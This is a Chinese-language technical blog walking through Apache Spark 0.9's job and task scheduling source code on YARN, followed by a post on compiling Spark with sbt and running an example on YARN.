valfunc2 = func.asInstanceOf[(TaskContext, Iterator[_]) => _]
 
valwaiter = new JobWaiter(this, jobId, partitions.size, resultHandler)
 
向akka的actor发送一个event,此event为JobSubmitted,!表示发送消息
 
eventProcessActor ! JobSubmitted(
 
jobId, rdd, func2, partitions.toArray, allowLocal, callSite, waiter, properties)
 
waiter
 
 }
 
 
 
在DAGShceduler中的start方法时，会生成如下代码，此代码receive接收eventProcessActor发送的消息并进行处理
 
def start() {
 
eventProcessActor = env.actorSystem.actorOf(Props(new Actor {
 
/**
 
 * A handle to the periodical task, used to cancel the task when the actor is stopped.
 
 */
 
varresubmissionTask: Cancellable = _
 
 
 
overridedef preStart() {
 
import context.dispatcher
 
/**
 
 * A message is sent to the actor itself periodically to remind the actor to resubmit failed
 
 * stages. In this way, stage resubmission can be done within the same thread context of
 
 * other event processing logic to avoid unnecessary synchronization overhead.
 
 */
 
resubmissionTask = context.system.scheduler.schedule(
 
RESUBMIT_TIMEOUT, RESUBMIT_TIMEOUT, self, ResubmitFailedStages)
 
 }
 
 
 
/**
 
 * The main event loop of the DAG scheduler.
 
 */
 
接收发送的scheduler事件，并通过processEvent进行处理。
 
def receive = {
 
caseevent: DAGSchedulerEvent =>
 
 logTrace("Got event of type " + event.getClass.getName)
 
 
 
/**
 
 * All events are forwarded to `processEvent()`, so that the event processing logic can
 
 * easily tested without starting a dedicated actor. Please refer to `DAGSchedulerSuite`
 
 * for details.
 
 */
 
if (!processEvent(event)) {
 
 submitWaitingStages()
 
 } else {
 
resubmissionTask.cancel()
 
context.stop(self)
 
 }
 
 }
 
 }))
 
 }
 
 
 
processEvent中处理JobSubmitted的处理流程:
 
以下代码中生成一个finalStage,每一个JOB都有一个finalStage,根据job划分出不同的stage，并且提交stage：
 
private[scheduler] def processEvent(event: DAGSchedulerEvent): Boolean = {
 
 event match {
 
case JobSubmitted(jobId, rdd, func, partitions, allowLocal, callSite, listener, properties) =>
 
varfinalStage: Stage = null
 
try {
 
// New stage creation may throw an exception if, for example, jobs are run on a HadoopRDD
 
// whose underlying HDFS files have been deleted.
 
finalStage = newStage(rdd, partitions.size, None, jobId, Some(callSite))
 
 } catch {
 
casee: Exception =>
 
 logWarning("Creating new stage failed due to exception - job: " + jobId, e)
 
listener.jobFailed(e)
 
returnfalse
 
 }
 
valjob = new ActiveJob(jobId, finalStage, func, partitions, callSite, listener, properties)
 
 clearCacheLocs()
 
 logInfo("Got job " + job.jobId + " (" + callSite + ") with " + partitions.length +
 
" output partitions (allowLocal=" + allowLocal + ")")
 
 logInfo("Final stage: " + finalStage + " (" + finalStage.name + ")")
 
 logInfo("Parents of final stage: " + finalStage.parents)
 
 logInfo("Missing parents: " + getMissingParentStages(finalStage))
 
如果可以本地运行，同时此finalStage没有stage的依赖关系,同时partitions只有一个。也就是只有一个处理的split
 
那么这时直接通过localThread的方式来运行此job实例。不通过TaskScheduler进行处理。
 
if (allowLocal && finalStage.parents.size == 0 && partitions.length == 1) {
 
// Compute very short actions like first() or take() with no parent stages locally.
 
listenerBus.post(SparkListenerJobStart(job, Array(), properties))
 
 runLocally(job)
 
 } else {
 
否则表示partitions有多个，或者stage本身的依赖关系，也就是像reduce这种场景。
 
根据job对应的stage(finalStage),调用submitStage,通过stage之间的依赖关系得出stage DAG，并以依赖关系进行处理：
 
idToActiveJob(jobId) = job
 
activeJobs += job
 
resultStageToJob(finalStage) = job
 
listenerBus.post(SparkListenerJobStart(job, jobIdToStageIds(jobId).toArray, properties))
 
 submitStage(finalStage)
 
 }
 
 
 
submitStage方法处理流程：
 
 private def submitStage(stage: Stage) {
 
valjobId = activeJobForStage(stage)
 
if (jobId.isDefined) {
 
 logDebug("submitStage(" + stage + ")")
 
if (!waiting(stage) && !running(stage) && !failed(stage)) {
 
valmissing = getMissingParentStages(stage).sortBy(_.id)
 
 logDebug("missing: " + missing)
 
if (missing == Nil) {
 
 logInfo("Submitting " + stage + " (" + stage.rdd + "), which has no missing parents")
 
 submitMissingTasks(stage, jobId.get)
 
running += stage
 
 } else {
 
for (parent <- missing) {
 
 submitStage(parent)
 
 }
 
waiting += stage
 
 }
 
 }
 
 } else {
 
 abortStage(stage, "No active job for stage " + stage.id)
 
 }
 
 }
 
 
 
对于一个刚生成的job,此时的stage为刚生成，
 
此时submitStage调用getMissingParentStages得到stage的parent,也就是RDD的依赖关系
 
生成parentStage是通过RDD的dependencies来生成相关的RDD的依赖关系，
 
 如果依赖关系是ShuffleDependency，生成一个mapStage来作为finalStage的parent,
 
 否则是NarrowDependency，不生成新的stage.如count，各task没有相关的数据依赖
 
也就是说，对应需要执行shuffle操作的job,会生成mapStage与finalStage进行，
 
而不需要shuffle的job只需要一个finalStage
 
 private def getMissingParentStages(stage: Stage): List[Stage] = {
 
valmissing = new HashSet[Stage]
 
valvisited = new HashSet[RDD[_]]
 
def visit(rdd: RDD[_]) {
 
if (!visited(rdd)) {
 
visited += rdd
 
if (getCacheLocs(rdd).contains(Nil)) {
 
for (dep <- rdd.dependencies) {
 
depmatch {
 
caseshufDep: ShuffleDependency[_,_] =>
 
valmapStage = getShuffleMapStage(shufDep, stage.jobId)
 
if (!mapStage.isAvailable) {
 
missing += mapStage
 
 }
 
casenarrowDep: NarrowDependency[_] =>
 
 visit(narrowDep.rdd)
 
 }
 
 }
 
 }
 
 }
 
 }
 
 visit(stage.rdd)
 
missing.toList
 
 }
 
 
 
接下来回到submitStage方法中,如果stage没有missing的stage时(没有parent stage)，执行task的提交操作。
 
 if (missing == Nil) {
 
 logInfo("Submitting " + stage + " (" + stage.rdd + "), which has no missing parents")
 
 submitMissingTasks(stage, jobId.get)
 
设置当前的stage为running,因为当前的stage没有parent的stage,直接running当前的stage
 
running += stage
 
 }else {
 
for (parent <- missing) {
 
此stage中包含有parent的stage,因此stage需要进行顺序执行。先执行parent的stage.递归调用
 
 submitStage(parent)
 
 }
 
设置当前的stage为waiting,表示此stage需要等待parent的执行完成。
 
waiting += stage
 
 }
 
 
 
执行submitMissingTasks流程处理，把stage根据partition生成TaskSet,通过TaskScheduler提交Task.
 
 private def submitMissingTasks(stage: Stage, jobId: Int) {
 
 logDebug("submitMissingTasks(" + stage + ")")
 
// Get our pending tasks and remember them in our pendingTasks entry
 
valmyPending = pendingTasks.getOrElseUpdate(stage, new HashSet)
 
myPending.clear()
 
vartasks = ArrayBuffer[Task[_]]()
 
检查stage是否是mapStage,如果是shuffleMapStage,生成ShuffleMapTask,并添加到tasks列表中。
 
mapStage表示还有其它stage依赖此stage
 
if (stage.isShuffleMap) {
 
for (p <- 0 until stage.numPartitionsif stage.outputLocs(p) == Nil) {
 
得到rdd stage中当前传入的partition的TaskLocation(也就是Task host)
 
vallocs = getPreferredLocs(stage.rdd, p)
 
tasks += new ShuffleMapTask(stage.id, stage.rdd, stage.shuffleDep.get, p, locs)
 
 }
 
 } else {
 
否则表示是一个finalStage,此类stage直接输出结果，生成ResultTask,并添加到tasks列表中。
 
// This is a final stage; figure out its job's missing partitions
 
valjob = resultStageToJob(stage)
 
for (id <- 0 until job.numPartitionsif !job.finished(id)) {
 
valpartition = job.partitions(id)
 
得到rdd stage中当前传入的partition的TaskLocation(也就是Task host)
 
vallocs = getPreferredLocs(stage.rdd, partition)
 
tasks += new ResultTask(stage.id, stage.rdd, job.func, partition, locs, id)
 
 }
 
 }
 
 
 
valproperties = if (idToActiveJob.contains(jobId)) {
 
idToActiveJob(stage.jobId).properties
 
 } else {
 
//this stage will be assigned to "default" pool
 
null
 
 }
 
 
 
// must be run listener before possible NotSerializableException
 
// should be "StageSubmitted" first and then "JobEnded"
 
listenerBus.post(SparkListenerStageSubmitted(stageToInfos(stage), properties))
 
如果有生成的tasks,也就是此job中有需要执行的task,
 
if (tasks.size > 0) {
 
// Preemptively serialize a task to make sure it can be serialized. We are catching this
 
// exception here because it would be fairly hard to catch the non-serializable exception
 
// down the road, where we have several different implementations for local scheduler and
 
// cluster schedulers.
 
try {
 
 SparkEnv.get.closureSerializer.newInstance().serialize(tasks.head)
 
 } catch {
 
casee: NotSerializableException =>
 
 abortStage(stage, "Task not serializable: " + e.toString)
 
running -= stage
 
return
 
 }
 
 
 
 logInfo("Submitting " + tasks.size + " missing tasks from " + stage + " (" + stage.rdd + ")")
 
myPending ++= tasks
 
 logDebug("New pending tasks: " + myPending)
 
执行TaskScheduler.submitTasks处理函数，TaskScheduler的实现在on yarn中为YarnClusterScheduler.
 
请参见下面的TaskScheduler提交task流程分析
 
 taskSched.submitTasks(
 
new TaskSet(tasks.toArray, stage.id, stage.newAttemptId(), stage.jobId, properties))
 
stageToInfos(stage).submissionTime = Some(System.currentTimeMillis())
 
 } else {
 
 logDebug("Stage " + stage + " is actually done; %b %d %d".format(
 
 stage.isAvailable, stage.numAvailableOutputs, stage.numPartitions))
 
running -= stage
 
 }
 
 }
 
 
 
到目前为此，job在DAGScheduler的处理流程完成。等待TaskScheduler处理完数据后，回调DAGScheduler.
 
 
 
TaskScheduler提交task流程分析
 
TaskScheduler在on yarn模式时,实现为YarnClusterScheduler。提交task时，通过调用submitTasks函数。
 
YarnClusterScheduler继承与TaskSchedulerImpl.
 
通过TaskSchedulerImpl.submitTasks对task的提交进行处理。
 
 
 
 override def submitTasks(taskSet: TaskSet) {
 
valtasks = taskSet.tasks
 
 logInfo("Adding task set " + taskSet.id + " with " + tasks.length + " tasks")
 
this.synchronized {
 
生成一个TaskSetManager实例，并把此实例设置到activeTaskSets的容器中。
 
在生成实例的过程中，会把taskSet传入，并得到要执行的task个数，
 
并根据task的location信息,
 
生成副本执行次数的容器copiesRunning，列表的个数为job中task的个数，所有的列表值为0，表示没有副本执行
 
把task分别放到pendingTasksForExecutor(process_local)此时没有值，
 
 /pendingTasksForHost(node_local),此时此节点的task全在此里面,host在worker注册时已经存在
 
 /pendingTasksForRack(rack)/，通常情况不会有值
 
 pendingTasksWithNoPrefs(待分配),通常情况不会有值。
 
 allPendingTasks(any)
 
 所有的task都在最后一个中。
 
valmanager = new TaskSetManager(this, taskSet, maxTaskFailures)
 
activeTaskSets(taskSet.id) = manager
 
把TaskSetManager添加到rootPool中。
 
schedulableBuilder.addTaskSetManager(manager, manager.taskSet.properties)
 
针对此TaskSet(job)生成一个跟踪每一个task的容器
 
taskSetTaskIds(taskSet.id) = new HashSet[Long]()
 
定时检查taskSet是否被启动，如果没有被启动，提示无资源，如果被启动成功，关闭此检查线程。
 
if (!isLocal && !hasReceivedTask) {
 
starvationTimer.scheduleAtFixedRate(new TimerTask() {
 
overridedef run() {
 
if (!hasLaunchedTask) {
 
 logWarning("Initial job has not accepted any resources; " +
 
"check your cluster UI to ensure that workers are registered " +
 
"and have sufficient memory")
 
 } else {
 
this.cancel()
 
 }
 
 }
 
 }, STARVATION_TIMEOUT, STARVATION_TIMEOUT)
 
 }
 
hasReceivedTask = true
 
 }
 
通过backend发起执行消息,backend是SchedulerBackend的具体实现，
 
在yarn-cluster模式为CoarseGrainedSchedulerBackend。
 
backend.reviveOffers()
 
 }
 
 
 
CoarseGrainedSchedulerBackend.reviveOffers
 
通过driverActor的actor实例发起一个ReviveOffers的事件处理消息。
 
 override def reviveOffers() {
 
driverActor ! ReviveOffers
 
 }
 
 
 
driverActor 的实现为CoarseGrainedSchedulerBackend.DriverActor实例。
 
 
 
DriverActor中处理revive的函数为receive.其中，处理ReviveOffers部分定义如下：
 
 case ReviveOffers =>
 
 makeOffers()
 
最终调用的makeOffers函数。
 
 def makeOffers() {
 
executorHost与freeCores的值由来请查看appmaster启动时的补充
 
 launchTasks(scheduler.resourceOffers(
 
executorHost.toArray.map {case (id, host) => new WorkerOffer(id, host, freeCores(id))}))
 
 }
 
 
 
通过CoarseGrainedSchedulerBackend对应的scheduler(TaskSchdulerImpl).resourceOffers得到tasks
 
 def resourceOffers(offers: Seq[WorkerOffer]): Seq[Seq[TaskDescription]] = synchronized {
 
 SparkEnv.set(sc.env)
 
 
 
// Mark each slave as alive and remember its hostname
 
for (o <- offers) {
 
把executor(worker)对应的host存储到对应的容器中,通过executorid拿host
 
executorIdToHost(o.executorId) = o.host
 
得到当前所有注册的worker的host,写入到对应的容器中,此容器表示node_local
 
if (!executorsByHost.contains(o.host)) {
 
executorsByHost(o.host) = new HashSet[String]()
 
 
 
通过DAGScheduler.executorGained把executorId与host进行处理,
 
 请参见下面DAGScheduler中处理ExecutorGained处理。
 
 executorGained(o.executorId, o.host)
 
 }
 
 }
 
根据所有的worker,根据每一个worker的的cpu core，生成[arraybuffer[]]
 
// Build a list of tasks to assign to each worker
 
valtasks = offers.map(o => new ArrayBuffer[TaskDescription](o.cores))
 
得到每一个worker可用的cpu
 
valavailableCpus = offers.map(o => o.cores).toArray
 
得到rootPool中排序后的队列中的所有的TaskSet存储的TaskSetMansger数组
 
valsortedTaskSets = rootPool.getSortedTaskSetQueue()
 
for (taskSet <- sortedTaskSets) {
 
 logDebug("parentName: %s, name: %s, runningTasks: %s".format(
 
taskSet.parent.name, taskSet.name, taskSet.runningTasks))
 
 }
 
 
 
// Take each TaskSet in our scheduling order, and then offer it each node in increasing order
 
// of locality levels so that it gets a chance to launch local tasks on all of them.
 
varlaunchedTask = false
 
迭代出每一个TaskSetMansger,同时根据每一个TaskSetMansger,
 
迭代去按网络的优先级执行PROCESS_LOCAL, NODE_LOCAL, RACK_LOCAL, ANY。
 
scala中的for如果包含多个执行器，也就是<-的表达式，多个用;号分开，后面一个优先前面一个执行
 
也就是后一个执行完成后，相当于一个嵌套的for
 
此处开始执行对taskSet的执行节点选择，针对每一个taskset,首先使用PROCESS_LOCAL开始。
 
for (taskSet <- sortedTaskSets; maxLocality <- TaskLocality.values) {
 
do {
 
迭代所有的worker,并在每迭代出一个worker时，在此机器上生成执行taskSet中对应的相关task
 
针对TaskSetmanager.resourceOffer的处理流程，见后面的细节分析，现在不分析此实现。
 
launchedTask = false
 
for (i <- 0 until offers.size) {
 
valexecId = offers(i).executorId
 
valhost = offers(i).host
 
生成task执行的节点信息等，每次执行 resourceOffer生成一个TaskDescription
 
把task对应的executorid与host添加到对应的activeExecutorIds 与executorsByHost。
 
for (task <- taskSet.resourceOffer(execId, host, availableCpus(i), maxLocality)) {
 
tasks(i) += task
 
valtid = task.taskId
 
taskIdToTaskSetId(tid) = taskSet.taskSet.id
 
taskSetTaskIds(taskSet.taskSet.id) += tid
 
taskIdToExecutorId(tid) = execId
 
此时把activeExecutorIds的值添加一个正在执行的executor,这个值的作用是当有多个stage的依赖时，
 
下一个stage在执行submitTasks时，
 
生成的TaskSetManager中会把新stage对应的task的executor直接使用此executor,也就是 PROCESS_LOCAL.
 
activeExecutorIds += execId
 
executorsByHost(host) += execId
 
 availableCpus(i) -= 1
 
launchedTask = true
 
 }
 
 }
 
通TaskLocality，如果在一个较小的locality时找到一个task,从这个locality中接着找，
 
否则跳出去从下一个locality重新找，放大locality的查找条件。
 
如果launchedTask的值为true,表示在传入的locality级别上查找到task要执行对应的级别，
 
那么在当前级别下接着去找到下一个可执行的TASK，否则launchedTask的值为false,放大一个locality的级别。
 
如launchedTask的值为false,当前迭代的locality的级别为PROCESS_LOCAL,那么把级别放大到NODE_LOCAL重新查找.
 
 } while (launchedTask)
 
 }
 
如果tasks生成成功，设置hasLaunchedTask的值为true,前面我们提到过的submitTasks中的检查线程开始结束。
 
if (tasks.size > 0) {
 
hasLaunchedTask = true
 
 }
 
返回生成成功的task列表。交给CoarseGrainedSchedulerBackend.launchTasks处理
 
returntasks
 
 }
 
 
 
 
 
CoarseGrainedSchedulerBackend.launchTasks处理流程：
 
通过worker注册的actor,向CoarseGrainedExecutorBackend发送消息，处理LaunchTask事件
 
 def launchTasks(tasks: Seq[Seq[TaskDescription]]) {
 
for (task <- tasks.flatten) {
 
 freeCores(task.executorId) -= 1
 
executorActor(task.executorId) ! LaunchTask(task)
 
 }
 
 }
 
 
 
CoarseGrainedExecutorBackend中处理LaunchTask事件事件。
 
 override def receive = {
 
 case LaunchTask(taskDesc) =>
 
 logInfo("Got assigned task " + taskDesc.taskId)
 
if (executor == null) {
 
 logError("Received LaunchTask command but executor was null")
 
 System.exit(1)
 
 } else {
 
通过executor执行task,见后面的分析。
 
executor.launchTask(this, taskDesc.taskId, taskDesc.serializedTask)
 
 }
 
 
 
TaskSetManager.resourceOffer函数，每次执行得到一个task的执行节点。
 
 
 
 def resourceOffer(
 
 execId: String,
 
 host: String,
 
 availableCpus: Int,
 
 maxLocality: TaskLocality.TaskLocality)
 
 : Option[TaskDescription] =
 
 {如果成功的task个数小于当前的job要执行的task的个数，
 
 同时worker中可用的cpu资源需要大于或等于spark.task.cpus配置的值，默认需要大于或等于1.
 
if (tasksSuccessful < numTasks && availableCpus >= CPUS_PER_TASK) {
 
valcurTime = clock.getTime()
 
得到一个默认的locality的值，默认情况下最有可能是NODE_LOCAL.
 
此处根据上一次查找可执行节点的时间，得到一个合适此执行时间的一个locality级别。
 
通过spark.locality.wait配置全局的等待时间。默认为3000ms。作用于PROCESS_LOCAL,NODE_LOCAL,RACK_LOCAL
 
通过spark.locality.wait.process配置PROCESS_LOCAL的等待时间。
 
通过spark.locality.wait.node配置NODE_LOCAL的等待时间。
 
通过spark.locality.wait.rack配置RACK_LOCAL的等待时间。
 
这里的查找方式是通过当前的currentLocalityIndex的值，默认从0开始，找到对应可执行的级别，
 
检查当前时间减去上次的查找级别的执行时间是否大于上面配置的在此级别的执行时间，
 
如果大于配置的时间，把currentLocalityIndex的值+1重新检查，返回一个合适的locality级别。
 
如果执行查找的时间超过了以上配置的几个locality的级别的查找时间，此时返回的值为ANY.
 
varallowedLocality = getAllowedLocalityLevel(curTime)
 
首先把当前可执行的locality设置为PROCESS_LOCAL.maxLocality是最大的级别，
 
得到的可执行级别不能超过此级别,从PROCESS_LOCAL开始一级一级向上加大。
 
maxLocality的级别从PROCESS_LOCAL一级一级向上加，
 
如果getAllowedLocalityLevel查找到的级别大于现在传入的级别。把级别设置为传入的级别。
 
maxLocality传入按PROCESS_LOCAL/NODE_LOCAL/RACK_LOCAL/ANY进行传入。
 
if (allowedLocality > maxLocality) {
 
allowedLocality = maxLocality // We're not allowed to search for farther-away tasks
 
 }
 
通过findTask来得到task对应的执行网络选择。
 
见下面的TaskSetManager.findTask选择task的执行节点的流程部分
 
 findTask(execId, host, allowedLocality) match {
 
case Some((index, taskLocality)) => {
 
// Found a task; do some bookkeeping and return a task description
 
valtask = tasks(index)
 
valtaskId = sched.newTaskId()
 
// Figure out whether this should count as a preferred launch
 
 logInfo("Starting task %s:%d as TID %s on executor %s: %s (%s)".format(
 
taskSet.id, index, taskId, execId, host, taskLocality))
 
设置task的执行副本加一，
 
// Do various bookkeeping
 
 copiesRunning(index) += 1
 
valinfo = new TaskInfo(taskId, index, curTime, execId, host, taskLocality)
 
taskInfos(taskId) = info
 
taskAttempts(index) = info :: taskAttempts(index)
 
得到当前加载的节点执行级别的index,并更新当前查找此执行节点的查找时间为当前时间。
 
// Update our locality level for delay scheduling
 
currentLocalityIndex = getLocalityIndex(taskLocality)
 
lastLaunchTime = curTime
 
// Serialize and return the task
 
valstartTime = clock.getTime()
 
// We rely on the DAGScheduler to catch non-serializable closures and RDDs, so in here
 
// we assume the task can be serialized without exceptions.
 
valserializedTask = Task.serializeWithDependencies(
 
task, sched.sc.addedFiles, sched.sc.addedJars, ser)
 
valtimeTaken = clock.getTime() - startTime
 
把task添加到runningTasksSet的容器中。
 
 addRunningTask(taskId)
 
 logInfo("Serialized task %s:%d as %d bytes in %d ms".format(
 
taskSet.id, index, serializedTask.limit, timeTaken))
 
valtaskName = "task %s:%d".format(taskSet.id, index)
 
如果task的执行尝试的值为1，表示是第一次尝试执行，通过DAGScheduler触发BeginEvent事件。
 
if (taskAttempts(index).size == 1)
 
 taskStarted(task,info)
 
return Some(new TaskDescription(taskId, execId, taskName, index, serializedTask))
 
 }
 
case _ =>
 
 }
 
 }
 
 None
 
 }
 
 
 
TaskSetManager.findTask选择task的执行节点的流程部分：
 
从不同的locality级别中取出需要执行的task.
 
 private def findTask(execId: String, host: String, locality: TaskLocality.Value)
 
 : Option[(Int, TaskLocality.Value)] =
 
 {
 
此处优先找PROCESS_LOCAL的值，但是我现在还没有搞明白这个pendingTasksForExecutor的值从何来。
 
从TaskSetManager生成时可以看出pendingTasksForExecutor的值在实例生成时,
 
从TaskSchedulerImpl.activeExecutorIds中检查并生成。但实例生成此，此容器还没有值。这点还没搞明白。
 
新的批注：
 
当有stage的依赖关系时，第一个stage执行完成后，activeExecutorIds的容器会有执行过的executor列表。
 
对上一个stage执行完成后，新的一个stage开始执行，
 
生成的TaskSetManager中pendingTasksForExecutor中包含可以直接使用上一个stage中部分task执行的executor的task.
 
因此，如果有stage的依赖关系时，下一个stage中的task在此时如果executorid相同，直接使用PROCESS_LOCAL来执行。
 
第一个stage执行时，PROCESS_LOCAL不会被选择，正常情况locality的选择会放大的NODE_LOCAL开始。
 
for (index <- findTaskFromList(getPendingTasksForExecutor(execId))) {
 
return Some((index, TaskLocality.PROCESS_LOCAL))
 
 }
 
if (TaskLocality.isAllowed(locality, TaskLocality.NODE_LOCAL)) {
 
for (index <- findTaskFromList(getPendingTasksForHost(host))) {
 
return Some((index, TaskLocality.NODE_LOCAL))
 
 }
 
 }
 
if (TaskLocality.isAllowed(locality, TaskLocality.RACK_LOCAL)) {
 
for {
 
rack <- sched.getRackForHost(host)
 
index <- findTaskFromList(getPendingTasksForRack(rack))
 
 } {
 
return Some((index, TaskLocality.RACK_LOCAL))
 
 }
 
 }
 
// Look for no-pref tasks after rack-local tasks since they can run anywhere.
 
for (index <- findTaskFromList(pendingTasksWithNoPrefs)) {
 
return Some((index, TaskLocality.PROCESS_LOCAL))
 
 }
 
if (TaskLocality.isAllowed(locality, TaskLocality.ANY)) {
 
for (index <- findTaskFromList(allPendingTasks)) {
 
return Some((index, TaskLocality.ANY))
 
 }
 
 }
 
// Finally, if all else has failed, find a speculative task
 
 findSpeculativeTask(execId, host, locality)
 
 }
 
appmaster启动时的补充
 
 
 
一些需要的说明：在makeOffers中调用了TaskScheduler.resourceOffers函数，
 
此函数中传入的executorHost,freeCores的值什么时候得到呢：
 
我们知道在appmaster启动的时候。会根据设置的num-worker个数，向rm申请worker运行的资源，
 
并通过WorkerRunnable启动worker对应的container。启动CoarseGrainedExecutorBackend实例在container中.
 
在实例中连接appmaster对应的sparkContext中的scheduler中的CoarseGrainedSchedulerBackend.DriverActor
 
此DriverActor的name为CoarseGrainedSchedulerBackend.ACTOR_NAME.
 
 
 
如下是CoarseGrainedExecutorBackend生成的一些代码片段：
 
YarnAllocationHandler.allocateResources中得到actor的名称。
 
 val workerId = workerIdCounter.incrementAndGet().toString
 
valdriverUrl = "akka.tcp://spark@%s:%s/user/%s".format(
 
sparkConf.get("spark.driver.host"),
 
sparkConf.get("spark.driver.port"),
 
 CoarseGrainedSchedulerBackend.ACTOR_NAME)
 
 
 
YarnAllocationHandler.allocateResources通过WorkerRunnable的线程启动worker的container
 
valworkerRunnable = new WorkerRunnable(
 
container,
 
conf,
 
sparkConf,
 
driverUrl,
 
workerId,
 
workerHostname,
 
workerMemory,
 
workerCores)
 
new Thread(workerRunnable).start()
 
 
 
在CoarseGrainedExecutorBackend实例启动时，向actor注册。
 
overridedef preStart() {
 
 logInfo("Connecting to driver: " + driverUrl)
 
driver = context.actorSelection(driverUrl)
 
发起worker启动时注册Executor的消息。
 
driver ! RegisterExecutor(executorId, hostPort, cores)
 
context.system.eventStream.subscribe(self, classOf[RemotingLifecycleEvent])
 
 }
 
 
 
CoarseGrainedSchedulerBackend中发起RegisterExecutor的事件处理。
 
def receive = {
 
case RegisterExecutor(executorId, hostPort, cores) =>
 
 Utils.checkHostPort(hostPort, "Host port expected " + hostPort)
 
如果此executorActor中已经包含有发送此消息过来的actor,表示此worker已经注册，
 
通过发送消息过来的actor(sender表示发送此消息的actor)发送一个RegisterExecutorFailed事件。
 
if (executorActor.contains(executorId)) {
 
sender ! RegisterExecutorFailed("Duplicate executor ID: " + executorId)
 
 } else {
 
否则表示actor(worker)还没有被注册，把actor添加到executorActor中，
 
同时向发送消息过来的actor(sender表示发送此消息的actor)发送一个RegisteredExecutor消息.
 
 logInfo("Registered executor: " + sender + " with ID " + executorId)
 
 sender ! RegisteredExecutor(sparkProperties)
 
executorActor(executorId) = sender
 
添加在TaskScheduler中提交task时使用的executorHost,与freeCores
 
executorHost(executorId) = Utils.parseHostPort(hostPort)._1
 
freeCores(executorId) = cores
 
executorAddress(executorId) = sender.path.address
 
addressToExecutorId(sender.path.address) = executorId
 
totalCoreCount.addAndGet(cores)
 
把现在注册的所有的节点添加到TaskScheduler.executorsByHost中。在生成TaskSetManager是会使用
 
 makeOffers()
 
 }
 
 
 
CoarseGrainedExecutorBackend中接收appmaster中scheduler的receive.
 
针对 RegisteredExecutor与 RegisterExecutorFailed的处理流程：
 
receive函数中处理RegisterExecutorFailed:如果已经存在，直接exit掉此jvm.
 
case RegisterExecutorFailed(message) =>
 
 logError("Slave registration failed: " + message)
 
 System.exit(1)
 
 
 
receive函数中处理RegisteredExecutor:如果不存在，生成Executor实例。此时worker启动完成，
 
并向master注册成功。
 
 case RegisteredExecutor(sparkProperties) =>
 
 logInfo("Successfully registered with driver")
 
// Make this host instead of hostPort ?
 
executor = new Executor(executorId, Utils.parseHostPort(hostPort)._1, sparkProperties)
 
 
 
RDD的依赖关系
 
..........
 
Spark中的Scheduler
 
........
 
Task的执行过程
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
spark编译与onyarn的运行, hongs-yang.iteye.com.blog.2056155, Mon, 28 Apr 2014 14:40:43 +0800

Spark on yarn执行流程源代码分析
 
目前的分析主要基于spark0.9.0的cdh5的版本进行分析，
 
源代码下载地址：https://github.com/cloudera/spark.git
 
下载方式：git clone url ./spark
 
进入spark目录，执行git checkout cdh5-0.9.0_5.0.0
 
 
 
 
源代码编译
 
使用sbt编译spark
 
运行sbt命令需要使用http代理，不然连接不上网络，进入sbt/目录，使用vim sbt修改里面的内容，
 
在最下面java 命令的第二行添加 -Dhttp.proxyHost=myserver -Dhttp.proxyPort=port \
 
运行如下命令编译spark
 
SPARK_HADOOP_VERSION=2.3.0-cdh5.0.0 SPARK_YARN=true sbt/sbt assembly
 
SPARK_HADOOP_VERSION后是hadoop的版本号，
 
 
 
SPARK_HADOOP_VERSION=2.2.0 sbt/sbt assembly
 
In addition, if you wish to run Spark on YARN, set SPARK_YARN to true:
 
SPARK_HADOOP_VERSION=2.0.5-alpha SPARK_YARN=true sbt/sbt assembly
 
http连接代理设置：
 
编辑spark_home/sbt/sbt文件，在文件最后的如下脚本部分：
 
printf "Launching sbt from ${JAR}\n"
 
java \
 
 -Xmx1200m -XX:MaxPermSize=350m -XX:ReservedCodeCacheSize=256m \
 
 -jar ${JAR} \
 
 "$@"
 
修改为
 
printf "Launching sbt from ${JAR}\n"
 
java \
 
 -Dhttp.proxyHost=myserver -Dhttp.proxyPort=port \
 
 -Xmx1200m -XX:MaxPermSize=350m -XX:ReservedCodeCacheSize=256m \
 
 -jar ${JAR} \
 
 "$@"
 
 
 
通过如下命令通过sbt对spark进行编译
 
SPARK_HADOOP_VERSION=2.3.0-cdh5.0.0 SPARK_YARN=true sbt/sbt assembly
 
 
 
sbt命令请参考http://www.scala-sbt.org/release/docs/Getting-Started/Running.html#common-commands
 
 
 
生成tar包
 
在spark_home的根目录下，执行如下命令，编译spark的分布式部署tar.gz包
 
修改make-distribution.sh文件，
 
在如下命令后
 
Make directories
 
rm -rf "$DISTDIR"
 
mkdir -p "$DISTDIR/jars"
 
echo "Spark $VERSION built for Hadoop $SPARK_HADOOP_VERSION" > "$DISTDIR/RELEASE"
 
 
# Copy jars
 
cp $FWDIR/assembly/target/scala*/*assembly*hadoop*.jar "$DISTDIR/jars/"
 
添加此信息，把examples添加到tar.gz包中(测试过程可以执行此操作,把示例的代码一起打包起来)。
 
# Make directories
 
mkdir -p "$DISTDIR/examples"
 
 
# Copy jars
 
cp $FWDIR/examples/target/scala*/*examples*assembly*.jar "$DISTDIR/examples/"
 
 
 
./make-distribution.sh --hadoop 2.3.0-cdh5.0.0 --with-yarn --tgz
 
命令执行完成后，在spark_home下会生成一个tar.gz包，spark-0.9.0-hadoop_2.3.0-cdh5.0.0-bin.tar.gz
 
 
 
通过Yarn运行spark示例程序
 
通过export命令设置yarn的conf环境变量，如果没有配置全局的yarn conf环境变量
 
 
 
export YARN_CONF_DIR=/home/hadoop/test.spark.yang/hadoop-2.0.0-cdh4.3.0/etc/hadoop
 
export SPARK_JAR=<spark_home>/jars/spark-assembly-0.9.0-incubating-hadoop2.0.0-cdh4.3.0.jar 
 
export YARN_CONF_DIR=/home/hadoop/test.spark.yang/hadoop-2.0.0-cdh4.3.0/etc/hadoop
 
export HADOOP_CONF_DIR=/home/hadoop/test.spark.yang/hadoop-2.0.0-cdh4.3.0/etc/hadoop
 
SPARK_JAR=/home/hadoop/test.spark.yang/spark-0.9.0-incubating/jars/spark-assembly-0.9.0-incubating-hadoop2.0.0-cdh4.3.0.jar
 
 
./bin/spark-class org.apache.spark.deploy.yarn.Client \
 
--jar ./examples/spark-examples-assembly-0.9.0-incubating.jar \
 
--class org.apache.spark.examples.SparkTC \
 
--args yarn-standalone \
 
--num-workers 3 \
 
--worker-cores 1 \
 
--master-memory 512M \
 
--worker-memory 1g
 
 
通过java程序执行spark on yarn的启动
 
1.编写一个java应用程序,把core-site/hdfs-site/yarn-site的配置文件添加到工程中。
 
2.把spark的jar添加到工程中，作用于当前工程的class引用,
 
3.在工程中设置环境变量SPARK_JAR,来引用spark jar的位置,
 
